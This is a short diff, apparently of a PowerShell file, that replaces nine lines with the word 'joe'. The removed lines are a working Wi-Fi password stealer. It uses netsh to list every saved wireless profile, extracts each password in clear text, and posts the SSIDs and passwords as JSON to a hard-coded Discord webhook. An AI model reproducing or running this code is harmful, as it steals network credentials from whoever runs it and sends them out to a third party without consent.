@@ -1,9 +1,1 @@
-$webhookUrl = "https://discord.com/api/webhooks/1192451944384577576/hNy6v9KbXM2QClFkMtHbOyg1KZSd57kfBUub3Lac_GNxWgsN_rfuY8_LUeI5mXIyDLzy"
-
-$output = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Out-String
-
-$body = @{
-    content = $output
-}
-
-Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body ($body | ConvertTo-Json)
+joe
